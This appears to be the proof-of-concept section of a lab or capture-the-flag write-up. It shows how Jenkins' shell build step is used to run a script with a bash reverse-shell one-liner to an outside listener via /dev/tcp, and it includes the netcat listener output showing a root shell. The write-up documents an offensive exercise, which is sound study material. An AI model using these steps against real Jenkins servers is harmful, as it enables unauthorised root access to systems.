
## PoC

After logging in and accessing Jenkins I navigated to Manage Jenkins > System > Scrolled Down to Shell.

Apparently we can run executable scripts here. So I navigated to the /tmp directory and created an malicious .sh script which should spawn us with an reverse shell.

```
$ cat shell.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/22 0>&1'
```

Started up my listener on port 22.

```
nc -lvnp 222
```

I navigated to Item > Entered an Project Name > Pressed on Freestyle Project and Okey > Pressed Build Now

Gained RCE as user "root".

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.127.103] 44946
bash: cannot set terminal process group (48037): Inappropriate ioctl for device
bash: no job control in this shell
root@vmdak:~/.jenkins/workspace/dwqdqw#
```